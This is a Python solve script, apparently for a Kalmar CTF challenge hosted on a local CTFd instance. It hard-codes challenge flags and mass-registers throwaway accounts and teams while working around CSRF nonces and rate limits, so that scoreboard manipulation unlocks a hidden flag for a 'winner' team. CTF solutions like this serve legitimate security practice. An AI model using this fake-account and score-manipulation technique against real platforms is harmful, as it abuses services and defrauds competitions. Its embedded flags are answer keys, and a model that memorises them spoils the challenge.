import asyncio
import aiohttp
import json
from bs4 import BeautifulSoup
import uuid
from typing import Optional
import re
import random

# CTFd instance URL
INSTANCE_URL = "http://localhost:8000"

# {"code":429,"message":"Too many requests. Limit is 10 requests in 5 seconds"}
sem = asyncio.Semaphore(10)

CHALLENGES = [
    {
        "category": "Web",
        "id": 5,
        "name": "Easy Challenge 1",
        "flag": "kalmar{m4rm4l4d3-cl1qu3-unch41n}",
    },
    {
        "category": "Rev",
        "id": 6,
        "name": "Easy Challenge 2",
        "flag": "kalmar{5733r5m4n-r3fu51ng-f0und1ng}",
    },
    {
        "category": "Pwn",
        "id": 8,
        "name": "Easy Challenge 4",
        "flag": "kalmar{ch13f-d0rk-rubb3d}",
    },
    {
        "category": "Misc",
        "id": 7,
        "name": "Easy Challenge 3",
        "flag": "kalmar{m4x1m1z3-r351d3nc3-umb1l1c4l}",
    },
    {
        "category": "Crypto",
        "id": 9,
        "name": "Easy Challenge 5",
        "flag": "kalmar{f3rr37-57471c-p4r4d0x}",
    },
    # {
    #     "category": "Impossible",
    #     "id": 1,
    #     "name": "Kalmarunionen Citizenship Exam",
    #     "flag": "kalmar{GrU91e2gNciCk3VAPA2bWnZXjGAHfjLDDX4uRYXf3ZUWvq2bP9nyvzBEAxREZlNRc7GK9hlgbaWPHYZ0tlTFv6EbGeCs2aBM0ehBK60MR8WjbWIuSYVGNahUnkwMaf9z}"
    # },
    # {
    #     "category": "Impossible",
    #     "id": 2,
    #     "name": "Cosmic Flag",
    #     "flag": "kalmar{cPjsrnajZ28IwnYcpEn326syn3JKHtGIFlqiPiFV0KLt2saTjzcHWJBmkt2hp1rvU3pj3IAGdpga5hJNmW6xCdjTNiUtKPTbcF0h8bBDBVtLQhWCfWffHKbl5bSqIkTp}"
    # },
    # {
    #     "category": "Impossible",
    #     "id": 3,
    #     "name": "CTF Time Travel",
    #     "flag": "kalmar{RKIZw9DzvMAAVK24Y8S5AiKnvqZxG3mtuff1nDoKZrOT5wWcbGcFX8Z2OldOupv2TPwaBajmXsy37cgV5OmylvSHZhIwhaYej9JR7CBTqcCEmD71jIkVWsPM4N0g3YDU}"
    # },
    # {
    #     "category": "Impossible",
    #     "id": 4,
    #     "name": "404: Web Challenge Not Found",
    #     "flag": "kalmar{HqYdGm3FYf3xsFl16QywrFaSQHFJcz3MpD91yJkb4RTyFZLaDVkyN3TTf18yeuo2j5JUyh03vDeULKAP3UjzCpeL6obqnww6CeOBDqC33l4N66HVk2cEKvBFbQZ52FHa}"
    # }
]

WINNER_CREDS = {
    "username": "winner",
    "password": "winnerUserLetsGo!",
    "team_name": "Winner Team",
    "team_password": "winnerTeamLetsGo!",
}


async def get_window_init_data(soup: BeautifulSoup) -> dict:
    # TeamID is in the response body like so:
    #   <script type="text/javascript">
    #       window.init = {
    #           'urlRoot': "",
    #           'csrfNonce': "830145de2eeeecf61d20f39dc434be6243179ffda5c7498d7d5a86f0d80a8f44",
    #           'userMode': "teams",
    #           'userId': 15,
    #           'userName': "user",
    #           'userEmail': "mail@example.com",
    #           'teamId': 12,
    #           'teamName': "teamname",
    #           'start': null,
    #           'end': null,
    #           'themeSettings': null,
    #           'eventSounds': [
    #             "/themes/core/static/sounds/notification.webm",
    #             "/themes/core/static/sounds/notification.mp3",
    #           ],
    #       }
    #   </script>
    scripts = soup.find_all("script")
    for script in scripts:
        if not script or not script.string:
            continue
        if "window.init" in script.string:
            window_init_value = script.string.split("window.init = ")[1]
            # replace single quotes with double quotes around keys and values
            window_init_value = window_init_value.replace("'", '"')
            # replace trailing commas with nothing
            window_init_value = re.sub(r",\s*}", "}", window_init_value)
            window_init_value = re.sub(r",\s*]", "]", window_init_value)
            # replace excess whitespace
            window_init_value = re.sub(r"\s+", " ", window_init_value).strip()
            # print(window_init_value)
            window_init_data = json.loads(window_init_value)
            return window_init_data
    return {}


async def get_nonce(session: aiohttp.ClientSession, url: str) -> str:
    async with session.get(url) as response:
        soup = BeautifulSoup(await response.text(), "html.parser")
        # The token is in the response body like so:
        # <input id="nonce" name="nonce" type="hidden" value="5566990eb7c3126c39daea268cdd4d1624e4a782d25e0ead395289fa3788607e">
        nonce_field = soup.find("input", {"id": "nonce"})
        nonce = nonce_field.get("value", None) if nonce_field else None
        if not nonce:
            # Try to get from window init data
            window_init_data = await get_window_init_data(soup)
            nonce = window_init_data.get("csrfNonce")
        if not nonce:
            return None
        print(f"Got nonce: {nonce}")
        return nonce


async def get_challenges(session: aiohttp.ClientSession) -> list[dict]:
    async with session.get(f"{INSTANCE_URL}/api/v1/challenges") as response:
        if response.status == 200:
            challenges = await response.json()
            print(f"Got {len(challenges['data'])} challenges")
            return challenges["data"]
        print(f"Failed to get challenges - status code {response.status}")
        print(await response.text(encoding="utf-8"))
    return []


async def submit_flag(
    session: aiohttp.ClientSession, challenge_id: int, flag: str
) -> bool:
    # Get nonce
    nonce = await get_nonce(session, f"{INSTANCE_URL}/challenges")
    if not nonce:
        raise Exception("Could not get nonce")

    async with session.post(
        f"{INSTANCE_URL}/api/v1/challenges/attempt",
        headers={"CSRF-Token": nonce},
        json={"challenge_id": challenge_id, "submission": flag},
    ) as response:
        if response.status == 200:
            print(f"Submitted flag for challenge {challenge_id}")
            data = await response.json()
            if data["data"]["status"] == "correct":
                print("Correct flag!")
                return True
            # if already solved
            if data["data"]["status"] == "already_solved":
                print("Already solved")
                return True
            print("Incorrect flag")
        print(
            f"Failed to submit flag for challenge {challenge_id} - status code {response.status}"
        )
        print(await response.text(encoding="utf-8"))
    return False


async def register_account(
    session: aiohttp.ClientSession,
    username: Optional[str] = None,
    password: Optional[str] = None,
    email: Optional[str] = None,
) -> tuple[bool, str, str]:
    """
    Register an account on the CTFd instance

    Curl:
    curl 'http://localhost:8000/register' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Prefer: safe' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost:8000' -H 'Connection: keep-alive' -H 'Referer: http://localhost:8000/register' -H 'Cookie: session=4e911e99-39cd-4739-8078-0c8c1a8dc399.L9UFNd1XO7avg_vCPcKtT0R3JHY' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Idempotency-Key: "606371302063795720"' -H 'Priority: u=0, i' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'name=user&email=mail%40example.com&password=password&nonce=5566990eb7c3126c39daea268cdd4d1624e4a782d25e0ead395289fa3788607e&_submit=Submit'
    """
    # First get the CSRF token
    nonce = await get_nonce(session, f"{INSTANCE_URL}/register")
    if not nonce:
        raise Exception("Could not get nonce")

    # Generate random username, password, and email if not provided
    if not username:
        username = str(uuid.uuid4())
    if not password:
        password = str(uuid.uuid4())
    if not email:
        email = f"{username}@chall-solve.tech"

    # Now we can register the account
    async with session.post(
        f"{INSTANCE_URL}/register",
        data={
            "name": username,
            "email": email,
            "password": password,
            "nonce": nonce,
            "_submit": "Submit",
        },
    ) as response:
        # When successfully registered, the response will redirect to the login page
        if response.status == 302 or response.status == 200:
            # Get user ID from response
            soup = BeautifulSoup(await response.text(), "html.parser")
            window_init_data = await get_window_init_data(soup)
            print(window_init_data)
            user_id = (
                int(window_init_data["userId"])
                if "userId" in window_init_data and window_init_data["userId"]
                else -1
            )
            if user_id <= 0:
                print("Failed to get user ID")
                return False, username, password
            print(
                f"Successfully registered account '{username}' ({user_id}) with password '{password}'"
            )
            return True, username, password
        print(f"Failed to register account {username} - status code {response.status}")
        print(await response.text(encoding="utf-8"))
    return False, username, password


async def create_team(
    session: aiohttp.ClientSession,
    team_name: Optional[str] = None,
    password: Optional[str] = None,
) -> tuple[bool, str, str, int]:
    # Get nonce
    nonce = await get_nonce(session, f"{INSTANCE_URL}/teams/new")
    if not nonce:
        raise Exception("Could not get nonce")

    # Generate random team name and password if not provided
    if not team_name:
        team_name = str(uuid.uuid4())
    if not password:
        password = str(uuid.uuid4())

    # Create team
    async with session.post(
        f"{INSTANCE_URL}/teams/new",
        data={
            "name": team_name,
            "password": password,
            "nonce": nonce,
            "_submit": "Create",
        },
    ) as response:
        if response.status == 302 or response.status == 200:
            # Get team ID from response
            soup = BeautifulSoup(await response.text(), "html.parser")
            window_init_data = await get_window_init_data(soup)
            print(window_init_data)
            team_id = (
                int(window_init_data["teamId"])
                if "teamId" in window_init_data and window_init_data["teamId"]
                else -1
            )
            if team_id == -1:
                print("Failed to get team ID")
                return False, team_name, password, -1
            print(
                f"Successfully created team '{team_name}' ({team_id}) with password '{password}'"
            )
            return True, team_name, password, team_id
        print(f"Failed to create team {team_name} - status code {response.status}")
        print(await response.text(encoding="utf-8"))
    return False, team_name, password, -1


async def create_account_and_team(
    session: aiohttp.ClientSession,
) -> tuple[bool, str, str, str, str, int]:
    success, username, password = await register_account(session)
    if not success:
        return False, username, password, "", "", -1
    success, team_name, team_password, team_id = await create_team(
        session, team_name=username
    )
    if not success:
        return False, username, password, team_name, team_password, -1
    return True, username, password, team_name, team_password, team_id


async def create_account_and_team_no_session() -> tuple[bool, str, str, str, str, int]:
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False)
    ) as session:
        # Make sure we don't exceed the rate limit
        async with sem:
            print("Sleeping for 5 seconds (rate limit)")
            await asyncio.sleep(5)
            print("Creating account and team")
            return await create_account_and_team(session)


async def mass_create_accounts_and_teams(
    count: int,
) -> list[tuple[bool, str, str, str, str, int]]:
    # Make tasks and gather them
    tasks = [create_account_and_team_no_session() for _ in range(count)]
    results = await asyncio.gather(*tasks)
    return results


async def logout(session: aiohttp.ClientSession) -> bool:
    async with session.get(f"{INSTANCE_URL}/logout") as response:
        if response.status == 302 or response.status == 200:
            print("Successfully logged out")
            return True
        print(f"Failed to logout - status code {response.status}")
        print(await response.text(encoding="utf-8"))
    return False


async def login(session: aiohttp.ClientSession, username: str, password: str) -> bool:
    # Get nonce
    nonce = await get_nonce(session, f"{INSTANCE_URL}/login")
    if not nonce:
        raise Exception("Could not get nonce")

    # Login
    async with session.post(
        f"{INSTANCE_URL}/login",
        data={
            "name": username,
            "password": password,
            "nonce": nonce,
            "_submit": "Submit",
        },
    ) as response:
        if response.status == 302 or response.status == 200:
            print(f"Successfully logged in as {username}")
            return True
        print(f"Failed to login as {username} - status code {response.status}")
        print(await response.text(encoding="utf-8"))
    return False


async def setup(session: aiohttp.ClientSession) -> tuple[bool, list[dict]]:
    # do not use this function, uhhh
    team_count = 0
    teams = []
    while team_count < 10:
        # Register an account
        success, username, password = await register_account(session)
        if not success:
            return False, teams
        # Create a team
        success, team_name, team_password, team_id = await create_team(
            session, team_name=username
        )
        if not success:
            return False, teams
        team_count = team_id
        teams.append(
            {
                "username": username,
                "password": password,
                "team_name": team_name,
                "team_password": team_password,
                "team_id": team_id,
            }
        )
        # Logout
        success = await logout(session)
        if not success:
            return False, teams
    print(f"Successfully setup {team_count} teams")

    return True, teams


async def get_flag(session: aiohttp.ClientSession) -> str:
    async with session.get(f"{INSTANCE_URL}/flag") as response:
        if response.status == 200:
            flag_text = await response.text()
            if "kalmar{" in flag_text:
                return flag_text
        print(f"Failed to get flag - status code {response.status}")
        print(await response.text(encoding="utf-8"))
        return ""


async def solve(session: aiohttp.ClientSession) -> bool:
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False)
    ) as winner_session:
        # Setup the winner team
        print("Setting up winner team")
        try:
            success, _, _ = await register_account(
                winner_session, WINNER_CREDS["username"], WINNER_CREDS["password"]
            )
            if success:
                success, _, _, _ = await create_team(
                    winner_session,
                    WINNER_CREDS["team_name"],
                    WINNER_CREDS["team_password"],
                )
                if success:
                    success = await logout(winner_session)
                    if not success:
                        return False
        except Exception as e:
            print(f"Failed to setup winner team: {e}")

        # Login as winner
        print("Logging in as winner")
        success = await login(
            winner_session, WINNER_CREDS["username"], WINNER_CREDS["password"]
        )
        if not success:
            return False

        # Submit all flags to the winner team
        print("Submitting flags to winner team")
        for challenge in CHALLENGES:
            success = await submit_flag(
                winner_session, challenge["id"], challenge["flag"]
            )
            if not success:
                return False

        # Get the flag
        flag = None
        print("Getting flag...")
        while not flag:
            # Create 20 new users and teams
            print("Creating 20 new users and teams")
            new_teams = await mass_create_accounts_and_teams(20)
            # Wait 5 seconds
            print("Waiting 5 seconds (rate limit)")
            await asyncio.sleep(5)
            # Create a new user and team
            print(
                "Creating new user and team to submit flags to 75% of the challenges (to update score)"
            )
            success, username, password = await register_account(session)
            if not success:
                return False
            success, team_name, team_password, team_id = await create_team(
                session, team_name=username
            )
            if not success:
                return False
            # Submit flags for 75% of the challenges (rounding down), but randomly
            print("Submitting flags for 75% of the challenges")
            challenges_to_solve = random.sample(CHALLENGES, int(len(CHALLENGES) * 0.75))
            for challenge in challenges_to_solve:
                success = await submit_flag(session, challenge["id"], challenge["flag"])
                if not success:
                    return False
            # Logout
            print("Logging out of user")
            success = await logout(session)
            if not success:
                return False

            # Try to get the flag
            print("Getting flag")
            flag = await get_flag(winner_session)
            if not flag:
                await asyncio.sleep(1)
        print(f"Flag: {flag}")
        return True


async def main():
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False)
    ) as session:
        # success, teams = await setup(session)
        # if not success:
        #     return
        success = await solve(session)
        if not success:
            return


if __name__ == "__main__":
    asyncio.run(main())
